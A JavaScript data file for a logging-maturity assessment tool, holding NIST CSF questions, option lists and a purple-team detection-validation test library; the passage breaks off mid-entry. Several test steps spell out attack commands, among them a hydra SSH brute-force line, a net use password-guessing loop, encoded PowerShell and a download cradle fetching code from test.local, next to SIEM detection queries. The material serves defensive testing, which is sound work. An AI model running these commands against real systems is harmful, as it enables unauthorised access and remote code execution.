// Assessment questions aligned with NIST CSF for logging maturity evaluation
export const assessmentQuestions = [
  // ============================================
  // IDENTIFY (ID) - Asset Management & Risk Assessment
  // ============================================
  {
    id: 'id1',
    category: 'Identify (CSF)',
    question: 'Do you maintain a comprehensive inventory of all log sources in your environment?',
    description: 'CSF ID.AM-1: Physical devices and systems are inventoried. This includes servers, network devices, applications, cloud services, and security tools.',
  },
  {
    id: 'id2',
    category: 'Identify (CSF)',
    question: 'Are log sources classified by criticality and data sensitivity?',
    description: 'CSF ID.AM-5: Resources are prioritized based on their classification, criticality, and business value.',
  },
  {
    id: 'id3',
    category: 'Identify (CSF)',
    question: 'Have you identified regulatory and compliance requirements for logging?',
    description: 'CSF ID.GV-3: Legal and regulatory requirements regarding cybersecurity are understood and managed (PCI-DSS, HIPAA, SOX, GDPR).',
  },
  {
    id: 'id4',
    category: 'Identify (CSF)',
    question: 'Is there a risk assessment that identifies logging gaps?',
    description: 'CSF ID.RA-1: Asset vulnerabilities are identified and documented, including blind spots in logging coverage.',
  },
  {
    id: 'id5',
    category: 'Identify (CSF)',
    question: 'Are data flows mapped to understand where logs should be collected?',
    description: 'CSF ID.AM-3: Communication and data flows are mapped to identify logging points.',
  },

  // ============================================
  // PROTECT (PR) - Data Security & Access Control
  // ============================================
  {
    id: 'pr1',
    category: 'Protect (CSF)',
    question: 'Are logs protected from unauthorized modification or deletion?',
    description: 'CSF PR.DS-1: Data-at-rest is protected. Log integrity is crucial for forensic investigations and compliance.',
  },
  {
    id: 'pr2',
    category: 'Protect (CSF)',
    question: 'Is access to log data restricted based on roles and responsibilities?',
    description: 'CSF PR.AC-4: Access permissions are managed using least privilege principles.',
  },
  {
    id: 'pr3',
    category: 'Protect (CSF)',
    question: 'Are logs encrypted in transit and at rest?',
    description: 'CSF PR.DS-2: Data-in-transit is protected using encryption for log shipping and storage.',
  },
  {
    id: 'pr4',
    category: 'Protect (CSF)',
    question: 'Is log storage capacity monitored and managed proactively?',
    description: 'CSF PR.DS-4: Adequate capacity to ensure availability is maintained, preventing log loss.',
  },
  {
    id: 'pr5',
    category: 'Protect (CSF)',
    question: 'Are logs being stored for an appropriate retention period?',
    description: 'CSF PR.IP-4: Backups of information are conducted and maintained. Retention should meet regulatory requirements (90 days to 1+ years).',
  },
  {
    id: 'pr6',
    category: 'Protect (CSF)',
    question: 'Is there a documented process for onboarding new log sources?',
    description: 'CSF PR.IP-1: Configuration management processes are established to ensure consistent log collection.',
  },

  // ============================================
  // DETECT (DE) - SIEM Configuration & Monitoring
  // ============================================
  {
    id: 'de1',
    category: 'Detect (CSF)',
    question: 'Do you have a SIEM or centralized log analysis platform deployed?',
    description: 'CSF DE.AE-3: Event data are aggregated and correlated from multiple sources and sensors.',
  },
  {
    id: 'de2',
    category: 'Detect (CSF)',
    question: 'Are logs normalized to a consistent format for analysis?',
    description: 'CSF DE.AE-3: Log normalization enables effective correlation and reduces analysis complexity.',
  },
  {
    id: 'de3',
    category: 'Detect (CSF)',
    question: 'Is timestamp synchronization (NTP) enforced across all log sources?',
    description: 'CSF DE.AE-1: A baseline of network operations is established. Accurate timestamps are critical for event correlation.',
  },
  {
    id: 'de4',
    category: 'Detect (CSF)',
    question: 'Are detection rules configured for credential-based attacks (brute force, credential stuffing)?',
    description: 'CSF DE.CM-1: The network is monitored for authentication anomalies and failed login patterns.',
    mitreTactics: ['TA0006'], // Credential Access
  },
  {
    id: 'de5',
    category: 'Detect (CSF)',
    question: 'Are detection rules configured for privilege escalation attempts?',
    description: 'CSF DE.CM-3: Personnel activity is monitored for unauthorized privilege changes.',
    mitreTactics: ['TA0004'], // Privilege Escalation
  },
  {
    id: 'de6',
    category: 'Detect (CSF)',
    question: 'Are detection rules configured for lateral movement indicators?',
    description: 'CSF DE.CM-1: Network monitoring detects unusual internal traffic patterns (RDP, SMB, WMI, PSExec).',
    mitreTactics: ['TA0008'], // Lateral Movement
  },
  {
    id: 'de7',
    category: 'Detect (CSF)',
    question: 'Are detection rules configured for data exfiltration patterns?',
    description: 'CSF DE.CM-1: Monitoring for unusual outbound data transfers, DNS tunneling, or cloud storage uploads.',
    mitreTactics: ['TA0010'], // Exfiltration
  },
  {
    id: 'de8',
    category: 'Detect (CSF)',
    question: 'Are detection rules configured for malware indicators (execution, persistence)?',
    description: 'CSF DE.CM-4: Malicious code is detected through process execution, file creation, and registry changes.',
    mitreTactics: ['TA0002', 'TA0003'], // Execution, Persistence
  },
  {
    id: 'de9',
    category: 'Detect (CSF)',
    question: 'Is there a process for tuning detection rules to reduce false positives?',
    description: 'CSF DE.DP-5: Detection processes are continuously improved based on feedback.',
  },
  {
    id: 'de10',
    category: 'Detect (CSF)',
    question: 'Are SIEM correlation rules using threat intelligence feeds?',
    description: 'CSF DE.AE-2: Detected events are analyzed to understand attack targets and methods using current threat data.',
  },
  {
    id: 'de11',
    category: 'Detect (CSF)',
    question: 'Is user and entity behavior analytics (UEBA) enabled for anomaly detection?',
    description: 'CSF DE.AE-1: Baseline behavior is established to detect deviations indicating compromise.',
  },
  {
    id: 'de12',
    category: 'Detect (CSF)',
    question: 'Are SIEM dashboards configured for real-time security monitoring?',
    description: 'CSF DE.DP-4: Event detection information is communicated to appropriate parties via dashboards.',
  },

  // ============================================
  // RESPOND (RS) - Response Planning & Analysis
  // ============================================
  {
    id: 'rs1',
    category: 'Respond (CSF)',
    question: 'Are logs readily accessible for incident investigation within SLA?',
    description: 'CSF RS.AN-1: Notifications from detection systems are investigated. Analysts should access logs within minutes.',
  },
  {
    id: 'rs2',
    category: 'Respond (CSF)',
    question: 'Can you correlate logs across different sources for a single incident?',
    description: 'CSF RS.AN-3: Forensics are performed to understand the full scope using correlated data.',
  },
  {
    id: 'rs3',
    category: 'Respond (CSF)',
    question: 'Do you have documented playbooks for log-based investigation?',
    description: 'CSF RS.RP-1: Response plan is executed during or after an event using documented procedures.',
  },
  {
    id: 'rs4',
    category: 'Respond (CSF)',
    question: 'Can analysts quickly pivot between related log events during investigation?',
    description: 'CSF RS.AN-2: The impact of incidents is understood through efficient log navigation.',
  },
  {
    id: 'rs5',
    category: 'Respond (CSF)',
    question: 'Are there automated response actions triggered by log events?',
    description: 'CSF RS.MI-2: Incidents are mitigated through SOAR integration and automated containment.',
  },

  // ============================================
  // RECOVER (RC) - Recovery & Improvements
  // ============================================
  {
    id: 'rc1',
    category: 'Recover (CSF)',
    question: 'Are logging capabilities regularly reviewed and assessed?',
    description: 'CSF RC.IM-1: Recovery plans incorporate lessons learned, including logging gaps discovered.',
  },
  {
    id: 'rc2',
    category: 'Recover (CSF)',
    question: 'Is there a process to identify and address logging gaps after incidents?',
    description: 'CSF RC.IM-2: Recovery strategies are updated based on post-incident analysis.',
  },
  {
    id: 'rc3',
    category: 'Recover (CSF)',
    question: 'Is there an owner responsible for the logging program?',
    description: 'CSF RC.CO-3: Recovery activities are communicated to stakeholders with clear ownership.',
  },
  {
    id: 'rc4',
    category: 'Recover (CSF)',
    question: 'Do you have documented logging policies and standards?',
    description: 'CSF ID.GV-1: Organizational security policy is established and communicated.',
  },

  // ============================================
  // INCIDENT RESPONSE READINESS
  // ============================================
  {
    id: 'ir1',
    category: 'IR Readiness',
    question: 'Can you detect and investigate unauthorized access to user accounts?',
    description: 'Requires: Authentication logs, failed login attempts, account lockouts, unusual login times/locations.',
    mitreTactics: ['TA0001', 'TA0006'], // Initial Access, Credential Access
  },
  {
    id: 'ir2',
    category: 'IR Readiness',
    question: 'Can you detect and investigate ransomware or destructive malware incidents?',
    description: 'Requires: File system logs, process execution, registry changes, volume shadow copy deletions, mass file modifications.',
    mitreTactics: ['TA0002', 'TA0003', 'TA0040'], // Execution, Persistence, Impact
  },
  {
    id: 'ir3',
    category: 'IR Readiness',
    question: 'Can you detect and investigate business email compromise (BEC)?',
    description: 'Requires: Email gateway logs, mailbox audit logs, forwarding rule changes, OAuth app consents.',
    mitreTactics: ['TA0001', 'TA0009'], // Initial Access, Collection
  },
  {
    id: 'ir4',
    category: 'IR Readiness',
    question: 'Can you detect and investigate data theft or exfiltration?',
    description: 'Requires: DLP logs, cloud storage access, USB device logs, large outbound transfers, DNS query logs.',
    mitreTactics: ['TA0009', 'TA0010'], // Collection, Exfiltration
  },
  {
    id: 'ir5',
    category: 'IR Readiness',
    question: 'Can you detect and investigate insider threat activity?',
    description: 'Requires: User activity logs, file access patterns, after-hours access, bulk downloads, print logs.',
    mitreTactics: ['TA0009', 'TA0010'], // Collection, Exfiltration
  },
  {
    id: 'ir6',
    category: 'IR Readiness',
    question: 'Can you detect and investigate network intrusion or APT activity?',
    description: 'Requires: Firewall logs, IDS/IPS alerts, DNS logs, proxy logs, endpoint detection logs, C2 beacon patterns.',
    mitreTactics: ['TA0001', 'TA0008', 'TA0011'], // Initial Access, Lateral Movement, Command and Control
  },
  {
    id: 'ir7',
    category: 'IR Readiness',
    question: 'Can you detect and investigate cloud service compromise?',
    description: 'Requires: Cloud audit logs (AWS CloudTrail, Azure Activity, GCP Audit), IAM changes, resource modifications.',
    mitreTactics: ['TA0001', 'TA0003', 'TA0004'], // Initial Access, Persistence, Privilege Escalation
  },
  {
    id: 'ir8',
    category: 'IR Readiness',
    question: 'Can you detect and investigate supply chain or third-party compromise?',
    description: 'Requires: Application logs, API access logs, vendor VPN logs, service account activity.',
    mitreTactics: ['TA0001'], // Initial Access (Supply Chain Compromise)
  },
  {
    id: 'ir9',
    category: 'IR Readiness',
    question: 'Can you detect and investigate denial of service attacks?',
    description: 'Requires: Network flow data, firewall logs, load balancer logs, application performance logs.',
    mitreTactics: ['TA0040'], // Impact
  },
  {
    id: 'ir10',
    category: 'IR Readiness',
    question: 'Can you detect and investigate web application attacks (SQLi, XSS)?',
    description: 'Requires: WAF logs, web server access logs, application error logs, database query logs.',
    mitreTactics: ['TA0001', 'TA0002'], // Initial Access, Execution
  },
  {
    id: 'ir11',
    category: 'IR Readiness',
    question: 'Can you reconstruct a full attack timeline from initial access to impact?',
    description: 'Requires: Correlated logs across network, endpoint, identity, and application layers with consistent timestamps.',
    mitreTactics: ['TA0001', 'TA0002', 'TA0003', 'TA0004', 'TA0005', 'TA0006', 'TA0007', 'TA0008', 'TA0009', 'TA0010', 'TA0011', 'TA0040'], // All kill chain tactics
  },
  {
    id: 'ir12',
    category: 'IR Readiness',
    question: 'Can you identify all affected systems and accounts during an incident?',
    description: 'Requires: Asset inventory integration, user-to-device mapping, network topology awareness in logs.',
    mitreTactics: ['TA0007', 'TA0008'], // Discovery, Lateral Movement
  },

  // ============================================
  // DETECTION VALIDATION (Purple Team)
  // ============================================
  {
    id: 'dv1',
    category: 'Detection Validation',
    question: 'Do you perform regular atomic tests to validate log capture?',
    description: 'Purple team testing using frameworks like Atomic Red Team to verify logs are generated for simulated attacks.',
  },
  {
    id: 'dv2',
    category: 'Detection Validation',
    question: 'Are detection rules tested against simulated attacks before production deployment?',
    description: 'New detection rules should be validated with controlled test cases before going live.',
  },
  {
    id: 'dv3',
    category: 'Detection Validation',
    question: 'Do you measure time-to-detect (TTD) for validated test cases?',
    description: 'Tracking detection latency helps identify performance issues and SLA compliance.',
  },
  {
    id: 'dv4',
    category: 'Detection Validation',
    question: 'Are log field completeness and quality regularly audited?',
    description: 'Validating that expected fields (user, IP, hostname, etc.) are present and properly parsed.',
  },
  {
    id: 'dv5',
    category: 'Detection Validation',
    question: 'Do you have a schedule for recurring detection validation tests?',
    description: 'Regular testing (monthly/quarterly) ensures continued detection efficacy after changes.',
  },
  {
    id: 'dv6',
    category: 'Detection Validation',
    question: 'Are test results documented and tracked over time?',
    description: 'Maintaining a history of test results enables trend analysis and regression detection.',
  },
  {
    id: 'dv7',
    category: 'Detection Validation',
    question: 'Do you validate detection coverage against the MITRE ATT&CK framework?',
    description: 'Mapping tests to ATT&CK techniques provides comprehensive coverage measurement.',
  },
  {
    id: 'dv8',
    category: 'Detection Validation',
    question: 'Are failed validation tests tracked through remediation?',
    description: 'Gaps identified through testing should be tracked until resolved with re-validation.',
  },
  {
    id: 'dv9',
    category: 'Detection Validation',
    question: 'Do you validate that alerts reach the SOC within expected timeframes?',
    description: 'End-to-end testing from attack execution to analyst notification.',
  },
  {
    id: 'dv10',
    category: 'Detection Validation',
    question: 'Are validation results shared with stakeholders and used for prioritization?',
    description: 'Test results should inform logging program improvements and resource allocation.',
  },
];

// Status options for log sources
export const statusOptions = [
  { value: 'collected', label: 'Collected', color: 'green' },
  { value: 'partial', label: 'Partial', color: 'yellow' },
  { value: 'planned', label: 'Planned', color: 'blue' },
  { value: 'not-collected', label: 'Not Collected', color: 'gray' },
  { value: 'blocked', label: 'Blocked', color: 'red' },
];

// Relationship types between log sources
export const relationshipTypes = [
  { 
    value: 'feeds', 
    label: 'Feeds Into', 
    description: 'Source sends logs/data to target',
    color: 'blue',
    icon: 'ArrowRight'
  },
  { 
    value: 'enriches', 
    label: 'Enriches', 
    description: 'Source provides context/enrichment to target',
    color: 'purple',
    icon: 'Sparkles'
  },
  { 
    value: 'triggers', 
    label: 'Triggers', 
    description: 'Source events trigger actions in target',
    color: 'orange',
    icon: 'Zap'
  },
  { 
    value: 'depends-on', 
    label: 'Depends On', 
    description: 'Source depends on target for operation',
    color: 'red',
    icon: 'Link'
  },
  { 
    value: 'aggregates', 
    label: 'Aggregates', 
    description: 'Source aggregates logs from target',
    color: 'green',
    icon: 'Layers'
  },
  { 
    value: 'normalizes', 
    label: 'Normalizes', 
    description: 'Source normalizes/parses logs from target',
    color: 'cyan',
    icon: 'FileCode'
  },
  { 
    value: 'correlates', 
    label: 'Correlates With', 
    description: 'Source correlates events with target',
    color: 'indigo',
    icon: 'GitMerge'
  },
  { 
    value: 'mirrors', 
    label: 'Mirrors', 
    description: 'Source mirrors/replicates target data',
    color: 'gray',
    icon: 'Copy'
  },
];

// Category options for log sources
export const categoryOptions = [
  'Network',
  'Endpoint',
  'Application',
  'Cloud',
  'Identity',
  'Security',
  'Database',
  'Email',
  'Web',
  'Other',
];

// Target types (ingestion destinations)
export const targetTypes = [
  { 
    value: 'siem', 
    label: 'SIEM', 
    description: 'Security Information and Event Management',
    color: 'purple',
    icon: 'Shield'
  },
  { 
    value: 'soar', 
    label: 'SOAR', 
    description: 'Security Orchestration, Automation and Response',
    color: 'orange',
    icon: 'Zap'
  },
  { 
    value: 'data-lake', 
    label: 'Data Lake', 
    description: 'Centralized data repository for analytics',
    color: 'blue',
    icon: 'Database'
  },
  { 
    value: 'log-collector', 
    label: 'Log Collector', 
    description: 'Log aggregation and forwarding service',
    color: 'cyan',
    icon: 'Server'
  },
  { 
    value: 'cloud-storage', 
    label: 'Cloud Storage', 
    description: 'Cloud-based storage (S3, Azure Blob, GCS)',
    color: 'sky',
    icon: 'Cloud'
  },
  { 
    value: 'xdr', 
    label: 'XDR', 
    description: 'Extended Detection and Response platform',
    color: 'red',
    icon: 'Eye'
  },
  { 
    value: 'edr', 
    label: 'EDR', 
    description: 'Endpoint Detection and Response',
    color: 'green',
    icon: 'Monitor'
  },
  { 
    value: 'ndr', 
    label: 'NDR', 
    description: 'Network Detection and Response',
    color: 'indigo',
    icon: 'Network'
  },
  { 
    value: 'ticketing', 
    label: 'Ticketing System', 
    description: 'Incident/ticket management system',
    color: 'yellow',
    icon: 'Ticket'
  },
  { 
    value: 'archive', 
    label: 'Archive', 
    description: 'Long-term log archive storage',
    color: 'gray',
    icon: 'Archive'
  },
  { 
    value: 'analytics', 
    label: 'Analytics Platform', 
    description: 'Business intelligence and analytics',
    color: 'pink',
    icon: 'BarChart'
  },
  { 
    value: 'other', 
    label: 'Other', 
    description: 'Other destination type',
    color: 'slate',
    icon: 'Box'
  },
];

// Target status options
export const targetStatusOptions = [
  { value: 'active', label: 'Active', color: 'green', description: 'Target is operational and receiving logs' },
  { value: 'maintenance', label: 'Maintenance', color: 'yellow', description: 'Target is under maintenance' },
  { value: 'degraded', label: 'Degraded', color: 'orange', description: 'Target is operational but with issues' },
  { value: 'offline', label: 'Offline', color: 'red', description: 'Target is not operational' },
  { value: 'planned', label: 'Planned', color: 'blue', description: 'Target is planned for future deployment' },
  { value: 'decommissioned', label: 'Decommissioned', color: 'gray', description: 'Target is no longer in use' },
];

// Default tags for log sources
export const defaultTagOptions = [
  { value: 'critical-asset', label: 'Critical Asset', color: 'red' },
  { value: 'compliance-required', label: 'Compliance Required', color: 'purple' },
  { value: 'pci-dss', label: 'PCI-DSS', color: 'blue' },
  { value: 'hipaa', label: 'HIPAA', color: 'blue' },
  { value: 'sox', label: 'SOX', color: 'blue' },
  { value: 'gdpr', label: 'GDPR', color: 'blue' },
  { value: 'cloud', label: 'Cloud', color: 'cyan' },
  { value: 'on-prem', label: 'On-Premise', color: 'gray' },
  { value: 'legacy', label: 'Legacy', color: 'orange' },
  { value: 'new', label: 'New', color: 'green' },
  { value: 'high-volume', label: 'High Volume', color: 'yellow' },
  { value: 'low-volume', label: 'Low Volume', color: 'gray' },
  { value: 'needs-review', label: 'Needs Review', color: 'orange' },
  { value: 'validated', label: 'Validated', color: 'green' },
  { value: 'deprecated', label: 'Deprecated', color: 'red' },
];

// Compliance frameworks
export const complianceFrameworks = [
  { 
    id: 'pci-dss', 
    name: 'PCI-DSS', 
    description: 'Payment Card Industry Data Security Standard',
    requirements: [
      { id: 'pci-10.1', name: '10.1', description: 'Implement audit trails to link all access to system components to each individual user' },
      { id: 'pci-10.2', name: '10.2', description: 'Implement automated audit trails for all system components' },
      { id: 'pci-10.3', name: '10.3', description: 'Record audit trail entries for all system components for each event' },
      { id: 'pci-10.5', name: '10.5', description: 'Secure audit trails so they cannot be altered' },
      { id: 'pci-10.7', name: '10.7', description: 'Retain audit trail history for at least one year' },
    ]
  },
  { 
    id: 'hipaa', 
    name: 'HIPAA', 
    description: 'Health Insurance Portability and Accountability Act',
    requirements: [
      { id: 'hipaa-164.312-b', name: '164.312(b)', description: 'Audit controls - hardware, software, and/or procedural mechanisms to record and examine activity' },
      { id: 'hipaa-164.308-a1', name: '164.308(a)(1)', description: 'Security Management Process - implement policies and procedures' },
      { id: 'hipaa-164.312-d', name: '164.312(d)', description: 'Person or entity authentication' },
    ]
  },
  { 
    id: 'sox', 
    name: 'SOX', 
    description: 'Sarbanes-Oxley Act',
    requirements: [
      { id: 'sox-302', name: 'Section 302', description: 'Corporate responsibility for financial reports' },
      { id: 'sox-404', name: 'Section 404', description: 'Management assessment of internal controls' },
    ]
  },
  { 
    id: 'nist-csf', 
    name: 'NIST CSF', 
    description: 'NIST Cybersecurity Framework',
    requirements: [
      { id: 'nist-de.ae', name: 'DE.AE', description: 'Anomalies and Events - Anomalous activity is detected' },
      { id: 'nist-de.cm', name: 'DE.CM', description: 'Security Continuous Monitoring' },
      { id: 'nist-pr.ds', name: 'PR.DS', description: 'Data Security - Information is protected' },
      { id: 'nist-rs.an', name: 'RS.AN', description: 'Analysis - Investigation and forensics conducted' },
    ]
  },
];

// Onboarding checklist steps
export const onboardingSteps = [
  {
    id: 'identify',
    title: 'Identify Source',
    description: 'Define the log source and its characteristics',
    fields: ['name', 'category', 'description', 'logType'],
  },
  {
    id: 'ownership',
    title: 'Assign Ownership',
    description: 'Determine who is responsible for this log source',
    fields: ['ownerTeam', 'ownerContact', 'criticalityTier'],
  },
  {
    id: 'compliance',
    title: 'Compliance & Tags',
    description: 'Tag for compliance requirements and categorization',
    fields: ['tags', 'retention'],
  },
  {
    id: 'technical',
    title: 'Technical Configuration',
    description: 'Document collection method and requirements',
    fields: ['collectionMethod', 'networkRequirements', 'credentials'],
  },
  {
    id: 'validation',
    title: 'Validation Plan',
    description: 'Plan for validating log collection',
    fields: ['validationPlan', 'expectedFields', 'sampleQuery'],
  },
  {
    id: 'review',
    title: 'Review & Submit',
    description: 'Review all information and create the source',
    fields: [],
  },
];

// Log type options
export const logTypeOptions = [
  { value: 'syslog', label: 'Syslog' },
  { value: 'windows-event', label: 'Windows Event Log' },
  { value: 'json', label: 'JSON' },
  { value: 'cef', label: 'CEF (Common Event Format)' },
  { value: 'leef', label: 'LEEF (Log Event Extended Format)' },
  { value: 'csv', label: 'CSV' },
  { value: 'xml', label: 'XML' },
  { value: 'netflow', label: 'NetFlow/IPFIX' },
  { value: 'pcap', label: 'PCAP' },
  { value: 'api', label: 'API/Webhook' },
  { value: 'database', label: 'Database Query' },
  { value: 'file', label: 'Flat File' },
  { value: 'cloud-native', label: 'Cloud Native' },
  { value: 'other', label: 'Other' },
];

// Criticality tier options
export const criticalityTierOptions = [
  { value: 'tier-1', label: 'Tier 1 - Critical', description: 'Business critical systems, core security infrastructure' },
  { value: 'tier-2', label: 'Tier 2 - High', description: 'Important production systems, key applications' },
  { value: 'tier-3', label: 'Tier 3 - Medium', description: 'Standard business systems' },
  { value: 'tier-4', label: 'Tier 4 - Low', description: 'Development, test, non-critical systems' },
];

// Retention period options
export const retentionOptions = [
  { value: '7d', label: '7 Days' },
  { value: '14d', label: '14 Days' },
  { value: '30d', label: '30 Days' },
  { value: '60d', label: '60 Days' },
  { value: '90d', label: '90 Days' },
  { value: '180d', label: '180 Days (6 months)' },
  { value: '365d', label: '365 Days (1 year)' },
  { value: '730d', label: '730 Days (2 years)' },
  { value: '1825d', label: '5 Years' },
  { value: '2555d', label: '7 Years' },
  { value: 'custom', label: 'Custom' },
];

// Assessment response options
export const assessmentResponseOptions = [
  { value: 'yes', label: 'Yes', score: 2 },
  { value: 'partial', label: 'Partial', score: 1 },
  { value: 'no', label: 'No', score: 0 },
  { value: 'na', label: 'N/A', score: null },
];

// Default columns for the inventory table
export const defaultColumns = [
  { id: 'name', label: 'Source Name', visible: true },
  { id: 'category', label: 'Category', visible: true },
  { id: 'status', label: 'Status', visible: true },
  { id: 'logType', label: 'Log Type', visible: true },
  { id: 'criticalityTier', label: 'Criticality Tier', visible: true },
  { id: 'ownerTeam', label: 'Owner Team', visible: true },
  { id: 'ownerContact', label: 'Owner Contact', visible: false },
  { id: 'retention', label: 'Retention', visible: false },
  { id: 'description', label: 'Description', visible: false },
  { id: 'notes', label: 'Notes', visible: false },
  { id: 'lastUpdated', label: 'Last Updated', visible: false },
];

// ============================================
// VALIDATION TEST LIBRARY (Purple Team)
// ============================================
export const validationTestLibrary = [
  // Initial Access
  {
    id: 'vt-t1078-001',
    name: 'Valid Account - Local Account Login',
    tactic: 'Initial Access',
    technique: 'T1078.001',
    techniqueName: 'Valid Accounts: Default Accounts',
    description: 'Test detection of successful authentication using local accounts',
    expectedLogSources: ['Windows Security', 'Linux Auth', 'PAM'],
    testProcedure: 'Authenticate using a local account and verify login event is captured',
    expectedFields: ['username', 'source_ip', 'logon_type', 'timestamp'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4624 (Successful Logon) with Logon Type 2 (Interactive) or 10 (Remote Interactive)',
        'Linux /var/log/auth.log or /var/log/secure entries showing "Accepted password" or "session opened"',
        'Account name, source workstation/IP, and authentication package used'
      ],
      howToTest: [
        'On Windows: Log in interactively to a test workstation using a local account (not domain-joined)',
        'On Linux: SSH into a test system using local credentials: ssh localuser@target-system',
        'For RDP: Connect to a system using local credentials via Remote Desktop',
        'Record the exact timestamp of your test login for correlation'
      ],
      expectedAlerts: [
        'New local account login from unexpected source',
        'First-time login for local account (UEBA baseline deviation)',
        'Local account used on domain-joined system (policy violation)'
      ],
      siemQueryExample: 'event.code:4624 AND winlog.event_data.LogonType:(2 OR 10) AND NOT user.domain:YOURDOMAIN',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md'
    }
  },
  {
    id: 'vt-t1078-002',
    name: 'Valid Account - Domain Account Login',
    tactic: 'Initial Access',
    technique: 'T1078.002',
    techniqueName: 'Valid Accounts: Domain Accounts',
    description: 'Test detection of successful domain authentication',
    expectedLogSources: ['Windows Security', 'Active Directory', 'Domain Controller'],
    testProcedure: 'Authenticate using domain credentials and verify event 4624 is logged',
    expectedFields: ['username', 'domain', 'source_ip', 'logon_type', 'workstation'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4624 on the target workstation showing domain logon',
        'Windows Event ID 4768 (TGT Request) on Domain Controller',
        'Windows Event ID 4769 (TGS Request) on Domain Controller',
        'Logon Type 3 (Network), 10 (RDP), or 2 (Interactive) depending on method'
      ],
      howToTest: [
        'Log into a domain-joined workstation using domain\\username credentials',
        'Map a network drive: net use Z: \\\\server\\share /user:DOMAIN\\username',
        'RDP to a domain system using domain credentials',
        'Test from an unusual source IP or at unusual hours for anomaly detection'
      ],
      expectedAlerts: [
        'Logon from new/unusual source IP or geolocation',
        'After-hours domain authentication',
        'Domain admin account used on non-admin workstation',
        'Multiple systems accessed in short timeframe (lateral movement indicator)'
      ],
      siemQueryExample: 'event.code:4624 AND user.domain:YOURDOMAIN AND source.ip:* | stats count by user.name, source.ip',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.002/T1078.002.md'
    }
  },
  {
    id: 'vt-t1110-001',
    name: 'Brute Force - Password Guessing',
    tactic: 'Initial Access',
    technique: 'T1110.001',
    techniqueName: 'Brute Force: Password Guessing',
    description: 'Test detection of multiple failed login attempts',
    expectedLogSources: ['Windows Security', 'Linux Auth', 'Azure AD', 'Okta'],
    testProcedure: 'Attempt 10+ failed logins against a test account within 5 minutes',
    expectedFields: ['username', 'source_ip', 'failure_reason', 'timestamp'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4625 (Failed Logon) - multiple occurrences in short time',
        'Sub Status codes: 0xC000006A (wrong password), 0xC0000064 (user not found)',
        'Linux: "Failed password" entries in auth.log with same source',
        'Azure AD: Sign-in failures in Azure AD sign-in logs',
        'Pattern: Same source IP attempting multiple usernames OR same username from single source'
      ],
      howToTest: [
        'Windows: for /L %i in (1,1,15) do net use \\\\target\\c$ /user:testuser wrongpass%i',
        'Linux: Use hydra or medusa against SSH: hydra -l testuser -P wordlist.txt ssh://target',
        'Manually attempt 10+ wrong passwords against a test account',
        'CAUTION: Coordinate with IT to avoid account lockouts on production accounts'
      ],
      expectedAlerts: [
        'Brute force attack detected - X failed logins in Y minutes',
        'Account lockout triggered',
        'Password spray attack (multiple users, same password)',
        'Credential stuffing attempt from known bad IP'
      ],
      siemQueryExample: 'event.code:4625 | stats count by source.ip, user.name | where count > 5',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.md'
    }
  },
  {
    id: 'vt-t1566-001',
    name: 'Phishing - Spearphishing Attachment',
    tactic: 'Initial Access',
    technique: 'T1566.001',
    techniqueName: 'Phishing: Spearphishing Attachment',
    description: 'Test detection of malicious email attachment delivery',
    expectedLogSources: ['Email Gateway', 'Microsoft 365', 'Exchange'],
    testProcedure: 'Send test email with EICAR attachment and verify detection',
    expectedFields: ['sender', 'recipient', 'subject', 'attachment_name', 'verdict'],
    guidance: {
      whatToLookFor: [
        'Email gateway logs showing attachment scanning verdict',
        'Microsoft 365 Threat Protection alerts in Security & Compliance Center',
        'Safe Attachments detonation results',
        'Attachment file type, hash, and sandbox analysis results',
        'User click/open events if attachment was delivered'
      ],
      howToTest: [
        'EICAR Test: Create file with content: X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
        'Send email with EICAR.txt attachment from external source to test mailbox',
        'Test with password-protected ZIP containing EICAR to test extraction',
        'Use GTPhish or similar to send simulated phishing with macro-enabled doc',
        'IMPORTANT: Use test/sandbox accounts and coordinate with email security team'
      ],
      expectedAlerts: [
        'Malicious attachment blocked/quarantined',
        'Suspicious file type detected (macro-enabled Office docs)',
        'Zero-day threat detected via sandbox detonation',
        'User opened/clicked malicious attachment'
      ],
      siemQueryExample: 'source:"email_gateway" AND verdict:("malicious" OR "suspicious") AND attachment:*',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/T1566.001.md'
    }
  },

  // Execution
  {
    id: 'vt-t1059-001',
    name: 'PowerShell Execution',
    tactic: 'Execution',
    technique: 'T1059.001',
    techniqueName: 'Command and Scripting Interpreter: PowerShell',
    description: 'Test logging of PowerShell command execution',
    expectedLogSources: ['Windows PowerShell', 'Sysmon', 'EDR'],
    testProcedure: 'Execute encoded PowerShell command and verify ScriptBlock logging (4104)',
    expectedFields: ['command_line', 'script_block', 'user', 'parent_process'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4104 (Script Block Logging) - shows deobfuscated PowerShell',
        'Windows Event ID 4103 (Module Logging) - shows pipeline execution details',
        'Sysmon Event ID 1 (Process Create) with powershell.exe and command line',
        'Look for encoded commands (-enc, -e), download cradles (IEX, Invoke-Expression)',
        'Suspicious parent processes (Word, Excel, WScript launching PowerShell)'
      ],
      howToTest: [
        'Basic: powershell.exe -Command "Write-Host \'Test\'"',
        'Encoded: powershell.exe -enc dwByAGkAdABlAC0AaABvAHMAdAAgACIAdABlAHMAdAAiAA==',
        'Download cradle: powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(\'http://test.local/test.txt\')"',
        'Ensure PowerShell Script Block Logging is enabled via GPO',
        'SAFE TEST: powershell.exe -c "$a=\'Hello\';$b=\'World\';Write-Host $a$b"'
      ],
      expectedAlerts: [
        'Encoded PowerShell execution detected',
        'PowerShell download cradle detected',
        'Suspicious PowerShell spawned by Office application',
        'PowerShell executing from unusual path',
        'AMSI bypass attempt detected'
      ],
      siemQueryExample: 'event.code:4104 AND powershell.scriptblock:("Invoke-Expression" OR "IEX" OR "DownloadString" OR "FromBase64String")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md'
    }
  },
  {
    id: 'vt-t1059-003',
    name: 'Windows Command Shell',
